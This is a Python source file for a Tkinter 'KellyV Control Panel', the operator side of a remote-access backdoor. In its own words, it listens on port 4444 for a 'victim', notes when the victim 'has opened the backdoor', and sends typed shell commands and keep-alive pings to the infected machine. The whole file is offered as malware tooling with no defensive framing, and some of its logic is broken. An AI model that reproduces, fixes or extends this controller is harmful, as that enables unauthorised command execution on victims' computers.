from tkinter import *
import socket, sched, time, subprocess, os

# initialization
root = Tk()
root.title("KellyV Control Panel")
root.geometry("500x400")
root.resizable(False, False)

#commandInput = Entry(width=60)
#commandInput.pack()
#commandInput.place(x=30, y=375)

# virus stuff
def connect():
	global runmain
	global pingtimer
	global my_ip
	global port
	global server 
	global victim 
	global victim_addr

	runmain = False
	pingtimer = 0
	my_ip = "localhost"
	port = 4444
	server = socket.socket()
	server.bind((my_ip, port))
	print("[+] Server has been started, listening for the victim.")
	server.listen()
	victim, victim_addr = server.accept()
	print(f"[+] {victim_addr} has opened the backdoor.")

def main():
	global connectionest
	connectionest = True
	pingtimer = 0
	command = None

	if connectionest == True:
		try:
			pingtimer += 1
			print(pingtimer)
			if pingtimer > 1000:
				victim.send("ping".encode())
				pingtimer = 0
				print("ping")

			command = commandInput.get() # here we obtain the command

			if len(command) < 1:
				print("[-] Command can't be null")
				command = "cd"

			if command == "say" or command == "python" or command == "python3":
				print("[-] Command not send because it breaks the connection.")
				command = "cd"

			command = command.encode()
			print(command)
			victim.send(command)
			print("[+] Command has been sent.")
			commandInput.text == None # reset the text lol

		except Exception as e:
			print(e)
			if type(e) == BrokenPipeError or type(e) == ConnectionResetError:
				connectionest = False
				runmain = True

# tkinter stuff
class KellyV:
	def __init__(self, master):
		connect()

		mainFrame = Frame(master)
		mainFrame.pack()

		# COMMAND HEADING
		heading1 = Label(master, text="Command:")
		heading1.pack()
		heading1.place(x=30, y=350)

		# VICTIM HEADING
		heading2 = Label(master, text="Victims")
		heading2.pack()
		heading2.place(x=350, y=15)

		# OUTPUT HEADING
		heading3 = Label(master, text="Output")
		heading3.pack()
		heading3.place(x=30 ,y=15)

		# OUTPUT TEXT
		outputText = Text(master, width=35, height=19)
		outputText.pack()
		outputText.place(x=30, y=35)

		# COMMAND ENTRY
		global commandInput
		commandInput = Entry(master, width=60)
		commandInput.pack()
		commandInput.place(x=30, y=375)

		# EXECUTE BUTTON 
		executeButton = Button(master, text="EXECUTE", command=main)
		executeButton.pack()
		executeButton.place(x=420, y=371)

e = KellyV(root)
root.mainloop()
